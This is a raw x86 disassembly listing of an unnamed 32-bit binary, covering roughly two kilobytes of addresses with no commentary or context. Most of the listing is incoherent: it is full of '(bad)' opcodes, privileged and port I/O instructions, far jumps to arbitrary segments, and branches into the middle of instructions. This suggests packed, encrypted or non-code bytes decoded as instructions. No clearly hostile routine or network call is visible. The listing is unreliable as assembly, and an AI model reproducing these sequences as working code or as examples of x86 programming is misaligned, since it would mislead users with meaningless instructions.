  419173:	or     ecx,DWORD PTR [ecx+0x13890f0a]
  419179:	inc    eax
  41917a:	cmp    eax,0x64
  41917d:	jne    0x41915b
  41917f:	cmp    eax,0x8bdd9cd7
  419184:	add    ebx,DWORD PTR [edx+ebp*1+0xf037807]
  41918b:	mov    ds:0x4d6c1e8b,al
  419190:	add    DWORD PTR [edx+ecx*4],0x4024890c
  419197:	add    al,0x96
  419199:	push   ebx
  41919a:	push   esi
  41919b:	xor    al,0xcf
  41919d:	jne    0x41917e
  41919f:	sbb    al,0xf8
  4191a1:	mov    esi,edx
  4191a3:	mov    ebx,eax
  4191a5:	(bad)  
  4191a6:	fsub   DWORD PTR [ecx-0x2]
  4191a9:	add    al,0x4
  4191ab:	fwait
  4191ac:	sub    eax,0x3aebdef8
  4191b1:	mov    eax,DWORD PTR [esi]
  4191b3:	lahf   
  4191b4:	inc    edx
  4191b5:	add    al,BYTE PTR [esi+0x4]
  4191b8:	adc    ecx,DWORD PTR [eax+ebp*4]
  4191bb:	into   
  4191bc:	jbe    0x41916e
  4191be:	mov    ebx,0x2414a788
  4191c3:	and    ebp,DWORD PTR [eax-0x1319fba8]
  4191c9:	(bad)  
  4191cb:	cmp    eax,0xb0d6db50
  4191d0:	add    DWORD PTR [ecx+0x5a],ebx
  4191d3:	pop    esi
  4191d4:	(bad)  
  4191d5:	mov    bl,0x24
  4191d7:	push   es
  4191d8:	test   DWORD PTR [esi],0x8b5089b6
  4191de:	adc    BYTE PTR [edi+0x10],al
  4191e1:	dec    esp
  4191e2:	cmp    al,0x48
  4191e4:	fsub   QWORD PTR [ebp+0xc7cf360]
  4191ea:	dec    edx
  4191eb:	add    al,0xb2
  4191ed:	loopne 0x419192
  4191ef:	or     eax,0xc0fbbede
  4191f4:	popw   ds
  4191f6:	push   edi
  4191f7:	push   ebp
  4191f8:	outs   dx,DWORD PTR ds:[esi]
  4191f9:	(bad)  [ebx-0x1037410]
  4191ff:	mov    DWORD PTR [edi],eax
  419201:	mov    eax,DWORD PTR [edx]
  419203:	ja     0x41926b
  419205:	(bad)  
  419206:	push   cs
  419207:	jbe    0x41924b
  419209:	push   0x43
  41920b:	pop    eax
  41920c:	push   ss
  41920d:	push   esp
  41920e:	repz pop ss
  419210:	mov    edx,DWORD PTR [edx-0x40]
  419213:	jle    0x419205
  419215:	add    eax,0x2f8bca22
  41921a:	add    ecx,DWORD PTR [ebp+0x1c]
  41921d:	cmp    ecx,eax
  41921f:	jne    0x419239
  419221:	xor    ch,ch
  419223:	neg    ch
  419225:	idiv   DWORD PTR [edx+0x3]
  419228:	rol    BYTE PTR [eax+0x40],0x8
  41922c:	pop    edx
  41922d:	or     al,0xc
  41922f:	add    DWORD PTR [esi-0x15],ebx
  419232:	push   ss
  419233:	add    ecx,DWORD PTR [eax]
  419235:	cmp    edi,edi
  419237:	pop    es
  419238:	outs   dx,BYTE PTR ds:[esi]
  419239:	in     eax,dx
  41923a:	shl    BYTE PTR [ebp+0xf],1
  41923d:	cmp    eax,0x3b07472f
  419242:	aaa    
  419243:	jne    0x4191f3
  419245:	mov    edx,ebx
  419247:	mov    esi,ebx
  419249:	add    al,BYTE PTR [ebx+0x6435c6bb]
  41924f:	test   al,al
  419251:	loope  0x4192c3
  419253:	pop    ecx
  419254:	pop    edx
  419255:	pop    ebp
  419256:	pop    edi
  419257:	mov    al,ds:0xfea704c1
  41925c:	(bad)  
  41925e:	fxtract 
  419260:	(bad)  
  419261:	in     eax,dx
  419262:	lods   al,BYTE PTR ds:[esi]
  419263:	(bad)  [esp+eiz*2]
  419266:	aam    0xa
  419268:	push   cs
  419269:	mov    esi,0x86820fde
  41926e:	ds shr ebp,0xf6
  419272:	xchg   BYTE PTR [edx-0x75],ah
  419275:	add    ebx,DWORD PTR ds:[edi+0x2a]
  419279:	stc    
  41927a:	add    edi,DWORD PTR [edx-0x38]
  41927d:	fbstp  TBYTE PTR [edx+0x76]
  419280:	push   cs
  419281:	jle    0x41925b
  419283:	std    
  419284:	shl    DWORD PTR [ecx],0x4e
  419287:	mov    ecx,DWORD PTR [esi]
  419289:	add    DWORD PTR [ecx+0x8],eax
  41928c:	movhps xmm5,QWORD PTR [ecx]
  41928f:	pop    eax
  419290:	push   es
  419291:	cmp    DWORD PTR [eax-0x77],0x7d
  419295:	pusha  
  419296:	stos   DWORD PTR es:[edi],eax
  419297:	dec    eax
  419298:	jne    0x4192f0
  41929a:	push   cs
  41929b:	add    ebx,ebp
  41929d:	dec    ebp
  41929e:	imul   eax,DWORD PTR [edi],0x75d87f05
  4192a4:	or     dl,BYTE PTR [ecx-0x15]
  4192a7:	xor    ecx,DWORD PTR [ebx+0x2a5a031a]
  4192ad:	pop    esp
  4192ae:	mov    edx,0xfc7efc3e
  4192b3:	int    0x8b
  4192b5:	jg     0x4192e5
  4192b7:	add    edi,DWORD PTR [ebp+0xc]
  4192ba:	sub    edi,ebx
  4192bc:	mov    DWORD PTR [ebx+ebp*1],edx
  4192bf:	enter  0x48fc,0xc
  4192c3:	(bad)  
  4192c4:	fcomi  st,st(0)
  4192c6:	or     bh,BYTE PTR [edx]
  4192c8:	addr16 push es
  4192ca:	pop    ecx
  4192cb:	jmp    0x4192e5
  4192cd:	retf   0x14eb
  4192d0:	and    al,0xd9
  4192d2:	lahf   
  4192d3:	add    BYTE PTR [edi],0x26
  4192d6:	push   es
  4192d7:	inc    eax
  4192d8:	cmp    ecx,DWORD PTR [edi]
  4192da:	test   DWORD PTR [ecx-0x1],ebx
  4192dd:	add    al,dh
  4192df:	loopne 0x419322
  4192e1:	xor    DWORD PTR [edx],0x908b106c
  4192e7:	xchg   BYTE PTR [ebx+0x2fbbd9da],cl
  4192ed:	fmul   DWORD PTR [esi+0x105afe81]
  4192f3:	add    BYTE PTR [ebp+0x7],bh
  4192f6:	mov    esi,0x810ceb0d
  4192fb:	(bad)  
  4192fc:	dec    eax
  4192fd:	mov    ds:0x12b66ff6,al
  419302:	and    esi,0x73890e06
  419308:	add    al,0x6a
  41930a:	add    DWORD PTR [eax+0x0],ebp
  41930d:	and    BYTE PTR [esi],dl
  41930f:	push   esi
  419310:	add    ebp,DWORD PTR [ecx+esi*4-0x1f]
  419314:	jg     0x4192be
  419316:	mov    edi,eax
  419318:	mov    DWORD PTR [ebx],edi
  41931a:	test   edi,edi
  41931c:	je     0x419341
  41931e:	xor    al,0xb8
  419320:	in     al,0x26
  419322:	loope  0x4192de
  419324:	push   es
  419325:	mov    ds:0x80481336,eax
  41932a:	dec    ebx
  41932b:	ficom  WORD PTR [eax+0x4d]
  41932e:	mov    al,0x3b
  419330:	push   ss
  419331:	ret    
  419332:	sbb    al,0x59
  419334:	(bad)  
  419335:	push   ebp
  419336:	pop    eax
  419337:	sub    al,0xc7
  41933a:	pop    edx
  41933b:	imul   ebp
  41933d:	or     al,0xb2
  41933f:	shr    DWORD PTR [edx+0x4],0x9f
  419343:	push   0x96a55517
  419348:	inc    ebp
  419349:	xchg   dh,dh
  41934b:	jne    0x41936c
  41934d:	icebp  
  41934e:	add    al,0x49
  419350:	pushf  
  419351:	sub    al,0x18
  419353:	ror    BYTE PTR [esi+0x18],0xed
  419357:	mov    bh,0x3c
  419359:	push   ebp
  41935a:	sbb    BYTE PTR [esi+0x3f],bl
  41935d:	call   0x2d08cff4
  419362:	inc    DWORD PTR [esi-0xce4e2e9]
  419368:	leave  
  419369:	mov    DWORD PTR [esp+ecx*1+0x58031054],edi
  419370:	push   ds
  419371:	fcomp  QWORD PTR ds:[esi]
  419374:	jecxz  0x41938a
  419376:	mov    eax,ds:0x6beb3c96
  41937b:	dec    ebp
  41937c:	aad    0xd6
  41937e:	pop    esp
  41937f:	sub    al,0xec
  419381:	sbb    BYTE PTR [eax+0x5c],0x3a
  419385:	jb     0x4193d9
  419387:	call   0x3f2:0x6983f7c
  41938e:	jo     0x4193a4
  419390:	ja     0x4193d7
  419392:	and    al,0x8
  419394:	jae    0x41936c
  419396:	(bad)  
  419398:	cmp    bh,ch
  41939a:	or     BYTE PTR [edx+0x68],al
  41939d:	or     BYTE PTR [ebx],al
  41939f:	push   0x76986c32
  4193a4:	es es mov eax,0x90a7058
  4193ab:	std    
  4193ac:	jne    0xc1d9ec7
  4193b2:	xor    al,0xa
  4193b4:	mov    DWORD PTR ds:0xbd94bac0,0x8fc1fc1d
  4193be:	scas   eax,DWORD PTR es:[edi]
  4193bf:	push   es
  4193c0:	jg     0x4193fd
  4193c2:	push   es
  4193c3:	jne    0x419351
  4193c5:	push   esi
  4193c6:	pop    es
  4193c7:	sbb    BYTE PTR [ecx-0x53],bl
  4193ca:	cmp    BYTE PTR [esi+0x711174fe],dl
  4193d0:	xchg   edx,eax
  4193d1:	je     0x419383
  4193d3:	test   eax,0x132b46bb
  4193d8:	inc    edi
  4193d9:	mov    ah,0x18
  4193dc:	lea    ebx,[edx+0x7d]
  4193df:	xor    al,BYTE PTR [ebx-0x21]
  4193e2:	call   0xa0b62133
  4193e7:	loope  0x41942e
  4193e9:	stos   BYTE PTR es:[edi],al
  4193ea:	jnp    0x4193e6
  4193ec:	(bad)  
  4193ed:	out    0xc0,al
  4193ef:	ret    0xe181
  4193f2:	add    al,dh
  4193f4:	faddp  st(3),st
  4193f6:	fneni(8087 only) 
  4193f8:	push   esp
  4193f9:	dec    esp
  4193fa:	mov    al,ds:0xffc28138
  4193ff:	(bad)  
  419401:	loop   0x419428
  419403:	cmp    cl,ch
  419405:	jmp    0x12ab:0x109ab60d
  41940c:	sub    ecx,ebx
  41940e:	dec    esp
  41940f:	dec    edi
  419410:	jo     0x41944e
  419412:	fld    DWORD PTR [edi]
  419414:	jmp    0x419471
  419416:	or     eax,0xc7fbd906
  41941b:	mov    es,WORD PTR [ebx]
  41941d:	jbe    0x419464
  41941f:	add    BYTE PTR ds:0x65067310,bh
  419425:	or     bl,al
  419427:	xor    dh,BYTE PTR [edi+0x76e92081]
  41942d:	pop    es
  41942e:	ja     0x41946b
  419430:	or     BYTE PTR [ebx+0x1f],dh
  419433:	push   ds
  419434:	fmul   st,st(7)
  419436:	mov    ah,0x1d
  419438:	adc    BYTE PTR [edx],bh
  41943a:	sub    eax,DWORD PTR [esi]
  41943c:	push   eax
  41943d:	es iret 
  41943f:	test   al,0x9
  419441:	out    dx,al
  419442:	jbe    0x4194bc
  419444:	push   es
  419445:	out    0xeb,eax
  419447:	setp   BYTE PTR [eax-0x1d53ef47]
  41944e:	loopne 0x419457
  419450:	jne    0x4193ee
  419452:	or     DWORD PTR [edi],0xf83c1e7b
  419458:	xor    bl,BYTE PTR [edx+ebp*8-0x7f]
  41945c:	lds    esp,FWORD PTR [ecx-0x1b]
  41945f:	xchg   DWORD PTR [ecx+edi*1-0x1c],ebp
  419463:	and    bl,BYTE PTR [eax+0x7b]
  419466:	add    DWORD PTR [ecx-0x75],eax
  419469:	loopne 0x4194ad
  41946b:	push   cs
  41946c:	pop    eax
  41946d:	add    edi,DWORD PTR [ecx+0x5]
  419470:	jg     0x41943c
  419472:	add    DWORD PTR [ebx],0x77
  419475:	push   es
  419476:	aaa    
  419477:	add    esi,DWORD PTR [ebx+0x20]
  41947a:	outs   dx,BYTE PTR ds:[esi]
  41947b:	inc    eax
  41947c:	xor    edx,DWORD PTR [esp+ebx*1+0x3c]
  419480:	add    ebp,DWORD PTR [ebp+0x3d]
  419483:	add    bl,BYTE PTR [edx]
  419485:	sbb    ah,BYTE PTR [esi]
  419487:	xor    BYTE PTR [ebp-0x61],0xf7
  41948b:	hlt    
  41948c:	xchg   edi,eax
  41948d:	mov    ds:0xd64675fb,eax
  419492:	mov    ebp,0x3f443ef4
  419497:	sar    BYTE PTR [edi+0x73],0x70
  41949b:	xor    BYTE PTR [edx],dl
  41949d:	push   ds
  41949e:	inc    ecx
  41949f:	cmp    esi,DWORD PTR [eax+0xc]
  4194a2:	jg     0x4194d8
  4194a4:	mov    ecx,ebx
  4194a6:	xlat   BYTE PTR ds:[ebx]
  4194a7:	inc    esi
  4194a8:	fild   WORD PTR [edi]
  4194aa:	xor    DWORD PTR [ebx-0x1bf93f2a],ecx
  4194b0:	push   edi
  4194b1:	pop    edi
  4194b2:	mov    edx,DWORD PTR [ebp+eiz*4+0x17e03395]
  4194b9:	add    DWORD PTR [eax],edi
  4194bb:	pand   mm0,QWORD PTR [edi]
  4194be:	in     al,0xae
  4194c0:	aaa    
  4194c1:	repnz inc edi
  4194c3:	mov    eax,DWORD PTR [edi]
  4194c5:	ds icebp 
  4194c7:	shr    BYTE PTR [edi],1
  4194c9:	jne    0x419486
  4194cb:	fnsave [ebx]
  4194cd:	pusha  
  4194ce:	test   DWORD PTR ds:0x8d267140,0x4dc5220a
  4194d8:	hlt    
  4194d9:	call   0xdd438cb8
  4194de:	xchg   edx,eax
  4194df:	daa    
  4194e0:	push   ebx
  4194e1:	add    al,0x3
  4194e3:	mov    edi,0xe909c01c
  4194e8:	jo     0x4194d1
  4194ea:	inc    esi
  4194eb:	or     al,0x89
  4194ed:	or     al,0x4c
  4194ef:	lock loopne 0x41951c
  4194f2:	push   ss
  4194f3:	cli    
  4194f4:	or     dh,0x4
  4194f7:	pop    ecx
  4194f8:	(bad)  
  4194f9:	iret   
  4194fa:	jne    0x419530
  4194fc:	mov    ecx,0x1d06cee7
  419501:	cmp    ebp,DWORD PTR [esi]
  419503:	je     0x419575
  419505:	data16 fwait
  419507:	mov    ds:0x753bd207,al
  41950c:	out    dx,eax
  41950d:	or     eax,0x1fc0305f
  419512:	pop    ebp
  419513:	xor    al,0xf
  419515:	mov    ds,WORD PTR [ecx+ebx*2+0x502bd78b]
  41951c:	xor    al,0xf
  41951e:	xor    al,0x78
  419520:	outs   dx,DWORD PTR ds:[esi]
  419521:	fwait
  419522:	push   cs
  419523:	add    eax,DWORD PTR [ecx+0xc]
  419526:	repnz or BYTE PTR [edi],dh
  419529:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41952a:	lock adc al,0x7c
  41952d:	cmp    eax,0x10333a05
  419532:	fimul  DWORD PTR [eax]
  419534:	aas    
  419535:	pusha  
  419536:	aam    0x74
  419538:	int    0x10
  41953a:	lahf   
  41953b:	sub    ecx,DWORD PTR [ebx-0x3bd26af4]
  419541:	sub    esi,DWORD PTR [eax+0x45]
  419544:	out    0x33,al
  419546:	ror    BYTE PTR [ecx+0x430aba10],cl
  41954c:	inc    eax
  41954d:	scas   al,BYTE PTR es:[edi]
  41954e:	cdq    
  41954f:	int3   
  419550:	test   DWORD PTR [edx+0x21348da2],ebp
  419556:	jbe    0x419562
  419558:	adc    BYTE PTR [edx+0x54],al
  41955b:	xchg   ebp,eax
  41955c:	add    ebx,DWORD PTR [edi]
  41955e:	cld    
  41955f:	shr    ebx,cl
  419561:	push   edx
  419562:	stc    
  419563:	cmp    ebx,ebp
  419565:	jne    0x4195a9
  419567:	pop    edi
  419568:	jg     0x4195a5
  41956a:	cmp    eax,edx
  41956c:	sbb    DWORD PTR [ecx-0x1a4f83b8],0x70
  419573:	cmp    BYTE PTR [esi+0x40f8694f],ch
  419579:	cs (bad) 
  41957b:	inc    eax
  41957c:	lock push ss
  41957e:	adc    eax,0x1ae4eda
  419583:	rcl    DWORD PTR [eax],cl
  419585:	pop    es
  419586:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419587:	in     eax,0xc3
  419589:	dec    edi
  41958a:	sub    DWORD PTR [edi-0x37],ecx
  41958d:	lea    ecx,[eax-0x34fc1e9b]
  419593:	rol    DWORD PTR [edi],1
  419595:	pushf  
  419596:	add    edx,eax
  419598:	and    al,al
  41959a:	adc    edi,DWORD PTR [ebp+0x3b2bd6c5]
  4195a0:	push   0x1cd25f76
  4195a5:	sub    ebx,DWORD PTR [edx-0x7c]
  4195a8:	dec    ecx
  4195a9:	add    DWORD PTR [esi],ecx
  4195ab:	mov    esi,0xbba40798
  4195b0:	cs hlt 
  4195b2:	mov    fs,eax
  4195b4:	pop    edi
  4195b5:	mov    ds,WORD PTR [esi+0x4c]
  4195b8:	test   ebx,ebx
  4195ba:	je     0x4195db
  4195bc:	pop    ebx
  4195be:	sbb    eax,0x8b0e8e0d
  4195c3:	inc    ecx
  4195c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4195c5:	xor    eax,0x58661cc3
  4195ca:	aam    0xf
  4195cc:	adc    al,0x7
  4195ce:	ja     0x4195d4
  4195d0:	outs   dx,DWORD PTR ds:[esi]
  4195d1:	xor    eax,esi
  4195d3:	sar    BYTE PTR [ebx+ebp*8-0x33],0x2a
  4195d8:	scas   eax,DWORD PTR es:[edi]
  4195d9:	push   ebp
  4195da:	mov    ebp,esp
  4195dc:	push   ecx
  4195dd:	fnstcw WORD PTR [edi+0x554805e8]
  4195e3:	push   0x64801bac
  4195e8:	push   DWORD PTR [edx]
  4195ea:	mov    DWORD PTR fs:[edx],esp
  4195ed:	push   0xc70151c4
  4195f2:	call   0x453d:0x80b802fd
  4195f9:	pusha  
  4195fa:	adc    al,0x7e
  4195fc:	or     ah,BYTE PTR ds:0xdbb27cc0
  419602:	xchg   BYTE PTR [ebx],dh
  419604:	pop    esp
  419605:	lahf   
  419606:	adc    esp,DWORD PTR [eax]
  419608:	pushw  0xff8
  41960c:	jle    0x419605
  41960e:	sbb    eax,0x1ca38d2e
  419613:	sub    al,BYTE PTR [ebx+0x40820a3d]
  419619:	mov    eax,0x700ff003
  41961e:	sub    eax,0x441b15ed
  419623:	xor    ah,0x40
  419626:	cmp    eax,0xf7b70a01
  41962b:	sub    edx,DWORD PTR [ebp+esi*2-0x14]
  41962f:	mov    DWORD PTR [ebp-0x4],0xc8b2804
  419636:	mov    edx,DWORD PTR [ebp-0x4]
  419639:	add    edi,esp
  41963b:	mov    esi,0x101178d9
  419640:	push   cs
  419641:	mov    ds:0x5c63010,eax
  419646:	mov    esp,0xf6c182c3
  41964b:	add    ah,BYTE PTR [edx+0x5a]
  41964e:	pop    ecx
  41964f:	pop    ecx
  419650:	fs sub al,0x68
  419653:	mov    bl,0x4e
  419655:	das    
  419656:	popa   
  419657:	neg    DWORD PTR [edi]
  419659:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41965a:	enter  0x6c3,0x26
  41965e:	test   al,0xeb
  419660:	in     eax,0xa0
  419662:	pop    ebx
  419663:	pop    ecx
  419664:	pop    ebp
  419665:	loope  0x4196b3
  419667:	test   DWORD PTR [ecx+0x5284aed6],eax
  41966d:	pop    ds
  41966e:	test   eax,0xe65bb02c
  419673:	test   al,ch
  419675:	cld    
  419676:	xchg   ah,cl
  419678:	mov    al,0x1c
  41967a:	xor    BYTE PTR [esi],al
  41967c:	stos   DWORD PTR es:[di],eax
  41967e:	mov    al,ds:0xd7b920
  419683:	mov    eax,ds:0xb03ae74b
  419688:	push   edi
  419689:	mov    DWORD PTR [eax+0x45318d64],esp
  41968f:	clc    
  419690:	mov    eax,ds:0xebc0ad80
  419695:	sbb    ecx,DWORD PTR ds:0x2d860f16
  41969b:	xchg   ebp,eax
  41969c:	jae    0x4196b5
  41969e:	cmp    DWORD PTR [ecx+0x49db750e],edi
  4196a4:	pop    edi
  4196a5:	loopne 0x41962f
  4196a7:	mov    DWORD PTR [ecx+0x7d83de91],esp
  4196ad:	cld    
  4196ae:	add    BYTE PTR [ebx+ecx*8-0x32],dh
  4196b2:	adc    DWORD PTR [ebp+0x12a10021],edx
  4196b8:	jmp    0x827e16fe
  4196bd:	add    esi,DWORD PTR [ebp-0x21]
  4196c0:	repz mov bh,0x1c
  4196c3:	ror    DWORD PTR [esi-0x72],1
  4196c6:	popa   
  4196c7:	pop    es
  4196c8:	rcr    bl,1
  4196ca:	pop    esp
  4196cb:	pop    ebp
  4196cc:	test   DWORD PTR [eax-0x72801e3],0x7583053b
  4196d6:	or     DWORD PTR [eax],eax
  4196d8:	adc    eax,0xcf80f815
  4196dd:	or     BYTE PTR [ebx],dl
  4196df:	push   eax
  4196e0:	or     BYTE PTR [ecx+0x4e7fcefa],al
  4196e6:	push   eax
  4196e7:	cld    
  4196e8:	mov    ?,edi
  4196ea:	fdiv   DWORD PTR [ebp+0x17]
  4196ed:	test   edx,edx
  4196ef:	jns    0x41970b
  4196f1:	ret    0xc103
  4196f4:	cli    
  4196f5:	add    ah,BYTE PTR [ecx+0x4eefe13f]
  4196fb:	sti    
  4196fc:	nop
  4196fd:	hlt    
  4196fe:	jmp    0x41974b
  419700:	sub    eax,0x8b2f0d8b
  419705:	sbb    al,0x24
  419707:	mov    DWORD PTR [ecx+edx*4-0xc],ebx
  41970b:	push   esi
  41970c:	loop   0x419754
  41970e:	sbb    al,0x89
  419710:	fist   DWORD PTR [eax]
  419712:	or     eax,0xdb11e21f
  419717:	mov    dl,0xeb
  419719:	sbb    DWORD PTR ds:0x519f5a59,esi
  41971f:	mov    ebx,DWORD PTR [ebx]
  419721:	icebp  
  419722:	lahf   
  419723:	mov    cs,esp
  419725:	push   es
  419726:	and    BYTE PTR [ecx-0x74e714ef],cl
  41972c:	adc    DWORD PTR [ebx+edi*1-0x842513e],eax
  419733:	xor    BYTE PTR [edx+0x3c],0x19
  419737:	add    edx,DWORD PTR [ebx+0xc]
  41973a:	adc    BYTE PTR ds:0xba321222,bl
  419740:	inc    ecx
  419741:	in     al,0xf1
  419743:	add    cl,al
  419745:	cmp    edx,DWORD PTR [ecx]
  419747:	bnd jnp 0x4197bb
  41974a:	cmp    bh,0x53
  41974d:	jle    0x4197ad
  41974f:	add    DWORD PTR [ebx-0x3579a5ff],ecx
  419755:	sub    ecx,0x4
  419758:	lea    ebx,[ecx+eax*1]
  41975b:	mov    DWORD PTR [esi],ebx
  41975d:	mul    ecx
  41975f:	idiv   bl
  419761:	cmp    edx,0x10
  419764:	jl     0x419779
  419766:	(bad)  
  419767:	mov    DWORD PTR [edx],0x8b804807
  41976d:	ror    DWORD PTR [edi+ecx*1],1
  419770:	mov    WORD PTR [edx+edi*2-0x75],cs
  419774:	push   eax
  419775:	fs cs retf 0x760f
  41977a:	leave  
  41977b:	add    ch,BYTE PTR [ecx+ecx*4]
  41977e:	test   BYTE PTR [esi],0x3f
  419781:	mov    bl,0x47
  419783:	or     BYTE PTR [edi+edi*8],ch
  419786:	add    eax,0x83d0cfac
  41978b:	jmp    0x4d4d:0x7e19d004
  419792:	jmp    0x1501:0x147fe8fc
  419799:	mov    al,0x83
  41979b:	mov    esi,0x14ddbf57
  4197a0:	call   0x7c4e0c63
  4197a5:	push   cs
  4197a6:	or     edx,0x2
  4197a9:	ins    BYTE PTR es:[edi],dx
  4197aa:	rol    BYTE PTR [eax+ebp*1],0xd
  4197ae:	int3   
  4197af:	(bad)  
  4197b1:	daa    
  4197b2:	stc    
  4197b3:	fwait
  4197b4:	or     al,BYTE PTR [ebx]
  4197b6:	ret    0x2083
  4197b9:	inc    bl
  4197bb:	push   ebx
  4197bc:	push   esi
  4197bd:	push   ecx
  4197be:	xchg   ecx,eax
  4197bf:	xor    bl,BYTE PTR [ecx-0x1e3522fe]
  4197c5:	cmp    ecx,0x4e9740b
  4197cb:	idiv   dl
  4197cd:	lods   eax,DWORD PTR ds:[esi]
  4197ce:	sti    
  4197cf:	fiadd  DWORD PTR [ecx-0x51d4361d]
  4197d5:	enter  0x1133,0xf7
  4197d9:	ret    0xf0fe
  4197dc:	aas    
  4197dd:	pop    esi
  4197de:	in     eax,0xfe
  4197e0:	sbb    DWORD PTR ds:0x740101f6,eax
  4197e6:	sub    DWORD PTR [ebx+0x2b08727c],ecx
  4197ec:	(bad)  
  4197ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4197ee:	or     al,0xfb
  4197f0:	xor    esi,DWORD PTR [ebx]
  4197f2:	cmp    esi,DWORD PTR [eax+0x8]
  4197f5:	xchg   DWORD PTR [esi],eax
  4197f7:	lea    esp,[ecx+0xc01fa6a]
  4197fd:	jle    0x4197dd
  4197ff:	les    ebx,FWORD PTR [esi-0x20224425]
  419805:	out    dx,eax
  419806:	fdiv   DWORD PTR [ebx]
  419808:	test   BYTE PTR [ebx-0x24ff56fd],0xb
  41980f:	and    eax,0x3f003c1
  419814:	fsub   DWORD PTR [edx]
  419816:	test   al,0x2
  419818:	aaa    
  419819:	mov    edx,0x1875c3b0
  41981e:	sub    BYTE PTR [ebx+0xe],ah
  419821:	inc    esi
  419822:	xor    eax,0x7e275c47
  419827:	and    DWORD PTR [ebx],0xfffffffe
  41982a:	mov    eax,esi
  41982c:	pop    edx
  41982d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41982e:	hlt    
  41982f:	pop    eax
  419830:	imul   esi,DWORD PTR ds:0xdb33c076,0xe34c0d2f
  41983a:	pop    ebx
  41983b:	mov    ah,0x5e
  41983d:	out    dx,al
  41983e:	dec    esi
  41983f:	(bad)  
  419840:	in     eax,0x81
  419842:	js     0x419848
  419844:	(bad)  
  419845:	mov    WORD PTR [esi-0x7e],?
  419848:	xchg   DWORD PTR [edi+0x0],edi
  41984b:	scas   al,BYTE PTR es:[edi]
  41984c:	ror    BYTE PTR [ebp-0x2ed4d1f4],1
  419852:	xor    bh,BYTE PTR [edi-0x24]
  419855:	mov    ds:0xf0edfdfd,al
  41985a:	sub    esi,ebp
  41985c:	push   0x2b
  41985e:	mov    DWORD PTR [ebx+0x167d0cf8],0x502bd551
  419868:	dec    eax
  419869:	(bad)  
  41986a:	cmovge eax,DWORD PTR [ebp-0x69384f11]
  419871:	or     cl,BYTE PTR [edx+ecx*2+0x14]
  419875:	(bad)  
  419876:	xor    BYTE PTR [ebp-0x203b57eb],cl
  41987c:	inc    ebp
  41987d:	add    al,0x21
  41987f:	mov    edi,DWORD PTR [esp]
  419882:	xchg   esi,eax
  419883:	cmp    ah,al
  419885:	aad    0xf3
  419887:	sahf   
  419888:	loope  0x4198f0
  41988a:	fst    QWORD PTR [eax-0x45b38553]
  419890:	push   ecx
  419891:	ja     0x419880
  419893:	sbb    esp,DWORD PTR [eax-0x39]
  419896:	add    ebp,ebx
  419898:	shl    BYTE PTR [esi+0xa],1
  41989b:	lea    edx,[edx+ecx*8]
  41989e:	rol    BYTE PTR [ebx-0x10],1
  4198a1:	mov    edx,esp
  4198a3:	test   BYTE PTR [edx+0x59b57007],cl
  4198a9:	mov    bl,0xf0
  4198ab:	ret    
  4198ac:	rcr    DWORD PTR [ecx+0x760b5820],0x53
  4198b3:	mov    DWORD PTR [ebx+ecx*8],esi
  4198b6:	mov    ch,BYTE PTR [ebx+ebp*2-0x4f]
  4198ba:	mov    DWORD PTR [eax-0x4d],ebx
  4198bd:	add    edi,DWORD PTR [eax+ebp*8]
  4198c0:	or     al,0x14
  4198c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4198c3:	sti    
  4198c4:	imul   esi,DWORD PTR [ebx-0x4c],0x5d
  4198c8:	jbe    0x419926
  4198ca:	test   eax,eax
  4198cc:	jo     0x41988e
  4198ce:	clc    
  4198cf:	add    al,BYTE PTR [ebx+eax*1-0x211e69a4]
  4198d6:	fdivr  QWORD PTR [edx+0x7b635006]
  4198dc:	retf   
  4198dd:	and    ebp,DWORD PTR [ecx]
  4198df:	test   BYTE PTR [edi*8-0x7f176940],0x45
  4198e7:	adc    DWORD PTR [esi-0x791282f0],edx
  4198ed:	inc    ecx
  4198ee:	add    bl,BYTE PTR [edi-0x43]
  4198f1:	stos   DWORD PTR es:[edi],eax
  4198f2:	dec    ecx
  4198f3:	mov    ds:0x8ad1724,eax
  4198f8:	cmc    
  4198f9:	or     BYTE PTR [ecx+0x26],dh
  4198fc:	ins    BYTE PTR es:[edi],dx
  4198fd:	ficom  WORD PTR [esi-0x6]
  419900:	cmp    al,0x7c
  419902:	or     eax,0x80d00ec9
  419907:	dec    ebp
  419908:	dec    esi
  419909:	cmp    esi,DWORD PTR [eax+0x41]
  41990c:	mov    eax,ds:0x418125e7
  419911:	sub    BYTE PTR [esi-0x67],dh
  419914:	scas   eax,DWORD PTR es:[edi]
  419915:	lock or eax,0x6efc07d9
  41991b:	cmp    DWORD PTR ds:0x407e8a14,0x11
  419922:	repnz or al,0xc1
  419925:	retf   0x1cdb
  419928:	aas    
  419929:	pop    es
  41992a:	es add bl,ch
  41992d:	sub    esp,DWORD PTR [ecx-0x7b27377d]
  419933:	enter  0xdca9,0x18
  419937:	fisttp QWORD PTR [eax-0x47d486f3]
  41993d:	jae    0x419942
  41993f:	sbb    BYTE PTR ds:0xbd8f4b0c,0xa2
  419946:	ror    DWORD PTR [ebp+0x2c8d84a4],0xa5
  41994d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41994e:	mov    edi,esp
  419950:	rol    BYTE PTR [ecx],0x9e
  419953:	lock dec eax
  419955:	adc    BYTE PTR [ebp+esi*2+0x1ad0bb43],al
  41995c:	jmp    0xf4945b1a
  419961:	fdiv   DWORD PTR [ebx-0x41]
  419964:	push   es
  419965:	jge    0x4198ea
  419967:	or     ah,BYTE PTR [ebp+0x1072918]
  41996d:	inc    edi
  41996e:	add    BYTE PTR [ebx],al
  419970:	or     bl,dh
  419972:	add    esi,DWORD PTR [eax+edi*8-0x50]
  419976:	out    dx,al
  419977:	stos   BYTE PTR es:[edi],al
  419978:	and    al,0x64
  41997a:	(bad)  
  41997b:	jae    0x419985
  41997d:	xor    DWORD PTR [eax+0x75f03b2d],edx
  419983:	adc    DWORD PTR [eax+0x18ad185f],edi
  419989:	add    al,0xba
  41998b:	not    ebx
  41998d:	sub    DWORD PTR [edi+0x4],0x32
  419991:	mov    ecx,0x33d81f1
  419996:	mov    edi,DWORD PTR [eax*1+0x5c3401b0]
  41999d:	je     0x41996f
  41999f:	add    bh,BYTE PTR [edi-0x722b8f38]
  4199a5:	inc    ebx
